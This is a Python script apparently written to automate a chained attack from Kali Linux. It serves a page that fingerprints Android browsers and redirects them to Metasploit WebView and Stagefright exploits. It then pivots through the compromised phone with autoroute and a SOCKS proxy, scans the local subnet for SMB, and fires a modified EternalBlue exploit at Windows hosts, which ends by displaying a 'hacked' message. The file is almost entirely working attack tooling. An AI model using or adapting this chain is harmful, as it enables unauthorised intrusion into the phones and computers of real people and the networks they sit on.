# Author: Leonardo Mazuran
# Must be run in kali linux
# Android to PC attack v1.2

from multiprocessing import Process
import subprocess
import socket
import urllib2
import time
import sys
import os
from shutil import copyfile

import thread
from threading import Thread


def get_ip_private():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com", 80))
        return (s.getsockname()[0])
    except:
        print ("Unable to retrieve local ip address")
        exit(1)



def get_ip_public():
    try:
        return (urllib2.urlopen('http://ip.42.pl/raw').read())
    except:
        print("Unable to get public ip address")
        exit(1)


def create_web_page():
    try:
        print("launching apache server")
	subprocess.check_call(['service','apache2', 'stop'], stdout=subprocess.PIPE)
        subprocess.check_call(['service','apache2', 'start'], stdout=subprocess.PIPE)
    except subprocess.CalledProcessError:
     print("Apache2 did not execute")
     exit(1)
    try:
        print("Writing attack.html to html folder")
        f=open("/var/www/html/attack.html","w")
        f.write("<html><title>Attack page</title><script type='text/javascript'>   var userAgent = navigator.userAgent.toLowerCase();"+
    "var check = userAgent.match(/android\s+(\d\.\d+)/) [1]; if (check < 4.2){window.location.replace(\"http://"+get_ip_private()+":8081/test1\");}"+
   "if(check >=5.0 || check >=5.1){window.location.replace(\"http://"+get_ip_private()+":8082/test2 \");}</script><body><center><h1> Nothing here</h1></center></body></html>")
        f.close()
	subprocess.check_call(['service','apache2', 'restart'], stdout=subprocess.PIPE)
    except:
        print("Failed to write to html folder")
        exit(1)



def create_autoscript():
    try:
        print("Writing autoscript")
        f = open("/root/Documents/attack.rc", "w")
        f.write("use exploit/android/browser/webview_addjavascriptinterface\nset AutoRunScript multi_console_command -rc /root/Documents/metandroid.rc\nset srvport 8081\nset uripath test1\nset lhost "+get_ip_private()+"\nset lport 4447\n"+
"exploit -j\nuse exploit/android/browser/stagefright_mp4_tx3g_64bit\nset srvport 8082\nset lport 4448\nset uripath test2\nexploit\necho set up complete! Link:http://"+get_ip_private()+"/attack.html\n"+
                "set AutoRunScript multi_console_command -rc /root/Documents/metandroid.rc")
        f.close()

    except:
        print ("Unable to write autoscript")
        exit(1)

def create_meter_android():

    try:
        print ("Creating meterpreter script for android")
        f = open("/root/Documents/metandroid.rc", "w")

        f.write("run post/multi/manage/autoroute\nrun auxiliary/server/socks4a srvport=1080 srvhost="+get_ip_private()+"\nrun /root/Documents/scanwin.rb")
        f.close()
    except:
        print ("Unable to create android script")
        exit(1)
def proxy():
    set = "socks4 "+get_ip_private()+" 1080"
    f = open('/etc/proxychains.conf', 'a+')
    f.write(set + "\n")

    f.close()


def adding_scan():
    try:
        file1 = "/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/scan.rb"
        file2 = "/root/Documents/scanwin.rb"
        if os.path.isfile(file1):
            print("scan.rb already installed!")
        else:
            print("installing scan.rb")
            copyfile("scan.rb", file1)
        if os.path.isfile(file2):
            print("scanwin.rb already installed!")

        else:
            print("installing scanwin.rb")
            copyfile("scanwin.rb", file2)
    except:
        print("Unable to input scan.rb/scanwin.rb to metasploit-framework/Documents!")
        exit(1)

def run_metasploit():
    print ("loading metasploit with autoscript")
    subprocess.call(['msfconsole', '-r', '/root/Documents/attack.rc'])


def attack_windows():

        a = False

        ipfile = "/root/Documents/attackip.txt"
        while a == False:
            if os.path.isfile(ipfile):
                print("IP is available")
                f = open(ipfile, 'r')
                ip = f.readline()
                os.remove(ipfile)
                #proxy()
                f.close()
                f = open("/root/Documents/attack2.rc",'w')
#TODO: check with autoscripting commands to allow shell commands through 
                f.write("\nuse exploit/windows/smb/ms17_010_eternalblue_mod\nset rhost "+ ip +"\nset GroomAllocations 12\nset GroomDelta 1\nset AutoRunScript /root/Documents/winauto.rb\nset MaxExploitAttempts 8\nset ProcessName explorer.exe\nrun")
                f.close()
                subprocess.call(['gnome-terminal','-e','proxychains','msfconsole', '-r', '/root/Documents/attack2.rc'])
                #proxy()
                break
            else:
                time.sleep(5)
#set AutoRunScript multi_console_command -rc /root/Documents/winauto.rc
def create_windows_shell_commands():
    try:
        print ("Writing a autoscript for windows")
        f = open("/root/Documents/winauto.rb" ,'w')
        f.write("\nsession.run_cmd(\"whoami\")\nsession.run_cmd(\"msg * This computer is hacked!!!!\")")
        f.close()
    except:
        print("Unable to write windows shell script!")
        exit(1)

def run_scanner():
	 a = False

         ipfile = "/root/Documents/subnetip.txt"
	 while a == False:
	 	if os.path.isfile(ipfile):
                	print("subnet good")
                	f = open(ipfile, 'r')
                	ip = f.readline()
                	os.remove(ipfile)
                	
                	f.close()
                	f = open("/root/Documents/scanner.rc",'w')

                	f.write("\nuse auxiliary/scanner/smb/scan\nset rhosts "+ ip +"/24\nrun")
                	f.close()
                	proxy()
			subprocess.call(['proxychains','msfconsole', '-r', '/root/Documents/scanner.rc'])
                	break
            	else:
                	time.sleep(5)
	





print (get_ip_private())
#print (get_ip_public())
create_web_page()
create_autoscript()
create_meter_android()
create_windows_shell_commands()
adding_scan()



Process(target = run_metasploit).start()
time.sleep(10)
Process(target = run_scanner).start()

attack_windows()

